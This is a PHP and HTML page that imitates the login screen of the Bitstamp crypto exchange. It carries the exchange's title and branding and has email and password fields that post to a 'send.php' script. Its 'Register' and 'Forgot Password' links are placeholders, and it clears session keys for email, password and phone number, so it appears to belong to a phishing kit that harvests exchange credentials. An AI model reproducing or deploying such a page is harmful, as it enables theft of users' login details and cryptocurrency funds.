<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    unset($_SESSION['email']);
    unset($_SESSION['password']);
    unset($_SESSION['phone_number']);
    $title = 'Bitstamp Trusted Crypto Exchange | Buy & Sell Cryptocurrencies';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-sm-5 my60">
                    <h3 class="h3 text-center fw-semibold pt10" style="color: #003B2F">Log In</h3>
                    <div class="py15 text-center mb50">
                        Don't have an account? 
                        <a href="#" class="text-primary-2 text-decoration-none">Register now for free.</a>
                    </div>
                    <form method="post" action="<?= base_url('send.php') ?>" >
                        <div class="form-floating mb30">
                            <input name="email" type="text" maxlength="60" required="" class="form-control form-control-lg form-control-add" placeholder="Email" value="" >
                            <label>Email or User ID</label>
                        </div>
                        <div class="form-floating my30">
                            <input name="password" type="password" required="" minlength="3" maxlength="50"  class="form-control form-control-lg form-control-add" placeholder="Login Password" value="" >
                            <label>Password</label>
                        </div>
                        <div class="row my25">
                            <div class="col-sm-12 text-end">
                                <a href="#" class="text-primary-2 text-decoration-none">Forgot Password</a>
                            </div>
                            <div class="col-sm-12 text-center my20 fs12">
                                This site is protected by hCaptcha and its 
                                <a class="text-decoration-none" href="https://hcaptcha.com/privacy" target="_blank">Privacy Policy</a>
                                and
                                <a class="text-decoration-none" href="https://hcaptcha.com/terms" target="_blank">Terms of Service</a>
                                apply
                            </div>
                        </div>
                        <div class="d-grid my25 mx60">
                            <button type="submit" class="btn btn-success btn-primary-2 py11">Log In</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>